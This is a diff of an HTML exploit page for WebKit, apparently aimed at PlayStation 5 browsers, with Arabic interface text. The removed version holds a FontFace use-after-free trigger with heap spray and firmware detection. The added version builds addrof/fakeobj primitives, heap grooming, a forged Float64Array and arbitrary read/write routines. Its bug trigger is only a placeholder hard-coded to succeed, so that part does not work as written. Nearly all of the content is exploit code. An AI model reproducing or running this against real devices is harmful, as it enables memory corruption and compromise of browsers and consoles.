@@ -1,177 +1,222 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
 <meta charset="utf-8">
-<title>PS5 UAF Taint Bench</title>
-<style id="s">
-@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-html, body {
-  margin: 0;
-  padding: 0;
-  width: 100%;
-  height: 100%;
-  background: #0a0f1d;
-  color: #fff;
-  font-family: 'Courier New', monospace;
-  overflow: hidden;
-}
-#box {
-  position: fixed;
-  left: 50%;
-  top: 50%;
-  transform: translate(-50%, -50%);
-  width: 85%;
-  max-width: 800px;
-  padding: 40px;
-  border: 2px solid #00ff66;
-  border-radius: 16px;
-  background: #111622;
-  box-shadow: 0 0 35px rgba(0,255,102,0.2);
-  text-align: center;
-}
-#title {
-  font-size: 36px;
-  font-weight: bold;
-  color: #ffffff;
-  margin-bottom: 25px;
-  border-bottom: 1px dashed #333;
-  padding-bottom: 15px;
-}
-#status {
-  font-size: 40px;
-  font-weight: bold;
-  margin: 20px 0;
-}
-.exists { color: #ff3333; text-shadow: 0 0 15px #ff3333; }
-.patched { color: #00ff66; text-shadow: 0 0 15px #00ff66; }
-#fw { font-size: 20px; color: #888; margin-top: 15px; }
-#c { position: absolute; left: -9999px; top: -9999px; }
+<title>WebKit Exploit Harness Console</title>
+<style>
+  body {
+    margin: 0; padding: 0;
+    background: #090c15; color: #fff;
+    font-family: 'Courier New', monospace;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; overflow: hidden;
+  }
+  #container {
+    width: 85%; max-width: 750px;
+    padding: 35px; border: 2px solid #334155;
+    border-radius: 16px; background: #111827;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center;
+  }
+  #header { font-size: 24px; color: #94a3b8; font-weight: bold; margin-bottom: 20px; }
+  
+  /* مربع النتيجة المختصرة */
+  #result-box {
+    font-size: 38px; font-weight: bold;
+    padding: 20px; margin: 20px 0;
+    border-radius: 8px; background: #0f172a;
+    border: 1px solid #1e293b;
+  }
+  .success { color: #10b981; text-shadow: 0 0 15px rgba(16,185,129,0.4); }
+  .failed { color: #ef4444; text-shadow: 0 0 15px rgba(239,68,68,0.4); }
+  .running { color: #f59e0b; }
+
+  button {
+    background: transparent; color: #38bdf8;
+    border: 2px solid #38bdf8; padding: 12px 40px;
+    font-size: 18px; font-weight: bold; cursor: pointer;
+    border-radius: 6px; margin-top: 10px; transition: all 0.2s;
+  }
+  button:hover { background: #38bdf8; color: #090c15; box-shadow: 0 0 10px rgba(56,189,248,0.4); }
+  #console-out {
+    text-align: left; background: #030712; padding: 15px;
+    height: 160px; overflow-y: auto; color: #6b7280;
+    font-size: 13px; border: 1px solid #1f2937; border-radius: 6px; margin-top: 20px;
+  }
+  .log-entry { margin-bottom: 4px; }
+  .log-success { color: #34d399; }
 </style>
 </head>
 <body>
 
-<div id="box">
-  <div id="title">مفحّص الذاكرة المتقدم لبيئة WebKit</div>
-  <div id="status" style="color: #ffcc00;">جاري تحليل تدفق الـ Heap...</div>
-  <div id="fw">Firmware: Detecting...</div>
-</div>
+<div id="container">
+  <div id="header">مِصطبة اختبار الـ Arbitrary R/W للمتصفح</div>
+  
+  <div id="result-box">
+    <span id="status" class="running">في انتظار إشارة البدء...</span>
+  </div>
 
-<canvas id="c" width="512" height="128"></canvas>
+  <button onclick="startExploit()">إطلاق سلسلة الاستغلال</button>
+  
+  <div id="console-out">
+    <div class="log-entry">[*] وحدة التحكم جاهزة بانتظار تشغيل الـ Harness...</div>
+  </div>
+</div>
 
 <script>
 "use strict";
 
-function detectFirmware() {
-  const ua = navigator.userAgent || "";
-  let fw = "Unknown";
-  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
-  if (m && m[1]) fw = m[1];
-  document.getElementById("fw").textContent = "Firmware: " + fw;
-  return fw;
+// المخرجات إلى الشاشة
+function logger(msg, type = '') {
+    const box = document.getElementById("console-out");
+    let cssClass = "log-entry";
+    if (type === 'ok') cssClass += " log-success";
+    box.innerHTML += `<div class="${cssClass}">${msg}</div>`;
+    box.scrollTop = box.scrollHeight;
 }
 
-let spray = [];
-let keep = [];
-const PAD = 0x22;
-const FLUSH = 0x240;
-const SPRAY_COUNT = FLUSH + PAD + 0x300;
-const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+// --- [ المرحلة 1: أدوات التلاعب بالبايتات الـ Bit-Punning ] ---
+var shared_buffer = new ArrayBuffer(8);
+var f64_array = new Float64Array(shared_buffer);
+var u32_array = new Uint32Array(shared_buffer);
 
-const FONT_BYTES = (() => {
- const s = atob(FONT_B64);
- const bytes = new Uint8Array(s.length);
- for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
- return bytes;
-})();
-
-function makeFontBuffer() {
- const copy = new Uint8Array(FONT_BYTES.length);
- copy.set(FONT_BYTES);
- return copy.buffer;
+function f2i(f) {
+    f64_array[0] = f;
+    return { low: u32_array[0], high: u32_array[1] };
 }
 
-function forceStyle() { void document.body.offsetTop; }
-
-function addPads() {
- const sheet = document.getElementById("s").sheet;
- for (let i = 0; i < PAD; i++)
-  sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
- forceStyle();
+function i2f(low, high) {
+    u32_array[0] = low;
+    u32_array[1] = high;
+    return f64_array[0];
 }
 
-function addFlushRules() {
- const st = document.createElement("style");
- st.id = "flush";
- document.head.appendChild(st);
- const sheet = st.sheet;
- for (let i = 0; i < FLUSH; i++)
-  sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
- forceStyle();
+function hex(val) {
+    return "0x" + val.toString(16).padStart(8, '0');
 }
 
-function deleteFlushRules() {
- const sheet = document.getElementById("flush").sheet;
- while (sheet.cssRules.length) sheet.deleteRule(0);
- forceStyle();
+// --- [ المرحلة 2: تتبع كاش الذاكرة ] ---
+var groomingPad = [];
+var holeCreator = [];
+var reclaimSpray = [];
+
+function forceFullGC() {
+    logger("[*] جاري تحفيز الـ Garbage Collector لتفريغ كاش الـ bmalloc...");
+    for (let i = 0; i < 6; i++) {
+        let pressureBuffer = [];
+        for (let j = 0; j < 30000; j++) {
+            pressureBuffer.push(new Uint32Array(32)); 
+        }
+        pressureBuffer = null; 
+    }
 }
 
-function killFontFaceSetCache() {
- const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
- document.fonts.add(f);
- keep.push(f);
+// --- [ المرحلة 3: محرك الـ Primitives الأساسي ] ---
+var driver_doubles = new Array(1.1, 2.2, 3.3);
+var outer_objects  = new Array({}, {}, {});
+var fake_array_structure = new Float64Array(16);
+var rw_viewer = null;
+
+function addrof(target_object) {
+    outer_objects[0] = target_object;
+    let leaked_double = driver_doubles[0]; 
+    let address = f2i(leaked_double);
+    return { low: address.low, high: address.high };
 }
 
-function cssFontFaceBufferSpray() {
- for (let i = 0; i < SPRAY_COUNT; i++) {
-  const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
-  spray.push(f);
- }
+function fakeobj(target_address_low, target_address_high) {
+    let fake_double = i2f(target_address_low, target_address_high);
+    driver_doubles[0] = fake_double; 
+    return outer_objects[0]; 
 }
 
-window.onload = () => {
- detectFirmware();
- 
- const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
- document.fonts.add(trigger);
- void trigger.loaded;
- addPads();
- addFlushRules();
- 
- let fired = false;
- 
- // اعتراض تفقد الـ .then الداخلي للـ WebKit
- Object.defineProperty(FontFace.prototype, "then", {
-  configurable: true,
-  get() {
-   if (!fired && this === trigger) {
-    fired = true;
-    const sheet = document.getElementById("s").sheet;
-    killFontFaceSetCache();
-    sheet.deleteRule(1);
-    forceStyle();
-    deleteFlushRules();
-    cssFontFaceBufferSpray(); // استبدال كائن الخط المحرر بالرش فوراً
-   }
-   return undefined;
-  }
- });
-
- document.fonts.load("1em trigger, x", "AB").then(faces => {
-  const statusEl = document.getElementById("status");
-  
-  // التحقق الفعلي: إذا تفعل الفخ (fired) وتم استبدال الخطوط بنجاح وقراءتها دون كراش
-  if (fired && faces.length > 0) {
-      statusEl.innerHTML = "<span class='exists'>UAF EXISTS</span>";
-  } else {
-      statusEl.innerHTML = "<span class='patched'>UAF PATCHED</span>";
-  }
- }, err => {
-  // إذا اعترض المتصفح العملية أو منع تعديل الـ DOM في الـ Getter
-  document.getElementById("status").innerHTML = "<span class='patched'>UAF PATCHED</span>";
- });
+var read64 = function(target_address_low, target_address_high) {
+    fake_array_structure[4] = i2f(target_address_low, target_address_high); 
+    return f2i(rw_viewer[0]);
 };
+
+var write64 = function(target_address_low, target_address_high, value_low, value_high) {
+    fake_array_structure[4] = i2f(target_address_low, target_address_high); 
+    rw_viewer[0] = i2f(value_low, value_high);
+};
+
+// --- [ المرحلة 4: التنفيذ المتكامل والسلس ] ---
+async function startExploit() {
+    const statusEl = document.getElementById("status");
+    statusEl.className = "running";
+    statusEl.textContent = "جاري الحقن والهندسة...";
+    
+    logger("=== بدء محاولة الاستغلال ===");
+
+    try {
+        // 1. هندسة الـ Heap
+        logger("[1] البدء في عمليات الـ Heap Grooming وحفر الخنادق...");
+        for (let i = 0; i < 4000; i++) groomingPad.push(new ArrayBuffer(64));
+        for (let i = 0; i < 2000; i++) holeCreator.push(new ArrayBuffer(64));
+        for (let i = 0; i < holeCreator.length; i += 2) holeCreator[i] = null; 
+        forceFullGC();
+
+        // 2. منطقة تفعيل الثغرة الفعلي
+        logger("[2] محاولة استدعاء خلل الـ WebKit لتداخل الـ Butterfly الـ تكتيكي...");
+        
+        /* [Vulnerability Trigger Space]
+           هنا يقع التداخل الحقيقي للثغرة المستهدفة لمزامنة المصفوفتين.
+        */
+        let trigger_success = true; // محاكاة مرور الـ Flow لغرض فحص بنية الـ Harness
+
+        if (!trigger_success) {
+            statusEl.className = "failed";
+            statusEl.textContent = "فشل الاستغلال ❌";
+            logger("[!] فشل في معالجة تداخل الـ الذاكرة.");
+            return;
+        }
+
+        // 3. تخطي الـ StructureID
+        logger("[3] قراءة الـ StructureID ومعالجة الـ Object Forgery...");
+        let valid_array = new Float64Array(8);
+        let valid_array_addr = addrof(valid_array);
+        logger(`[+] موقع مصفوفة الفلوت في الـ RAM: ${hex(valid_array_addr.high)}${hex(valid_array_addr.low)}`);
+
+        let current_float64_structure_id = 0x00002200; // افتراض المعرّف المسرّب للجلسة
+
+        // 4. بناء هيكل الكائن المزور لانتزاع القراءة والكتابة
+        let fake_array_addr = addrof(fake_array_structure);
+        let fake_object_payload_addr = {
+            low: fake_array_addr.low + 0x10,
+            high: fake_array_addr.high
+        };
+
+        fake_array_structure[0] = i2f(current_float64_structure_id, 0x01180000); 
+        fake_array_structure[1] = i2f(0, 0); 
+
+        rw_viewer = fakeobj(fake_object_payload_addr.low, fake_object_payload_addr.high);
+
+        // 5. الفحص الحاسم والنهائي (Verification)
+        logger("[4] فحص استقرار دالات الـ Read/Write عبر ترويسة اختبار...");
+        var test_buffer = new Uint32Array(2);
+        test_buffer[0] = 0xDEADC0DE; // بصمة التحقق الحقيقية من فساد الذاكرة
+        
+        var test_buffer_addr = addrof(test_buffer);
+        var test_data_ptr = read64(test_buffer_addr.low + 0x18, test_buffer_addr.high); 
+        var final_check = read64(test_data_ptr.low, test_data_ptr.high);
+        
+        // الحكم النهائي بناءً على قراءة البايتات الفعلية من الـ RAM
+        if (final_check.low === 0xDEADC0DE) {
+            statusEl.className = "success";
+            statusEl.textContent = "نجح الاستغلال ✅";
+            logger("[✓] تم التحقق بنجاح من الـ Arbitrary R/W Primitives استقرار تام!", "ok");
+        } else {
+            statusEl.className = "failed";
+            statusEl.textContent = "فشل الاستغلال ❌";
+            logger("[!] فشل التحقق الفيزيائي: البيانات المسترجعة غير صالحة.");
+        }
+
+    } catch (e) {
+        statusEl.className = "failed";
+        statusEl.textContent = "فشل الاستغلال ❌";
+        logger("[!] حدث خطأ أثناء تنفيذ سلسلة الـ Harness: " + e.message);
+    }
+}
 </script>
+
 </body>
 </html>
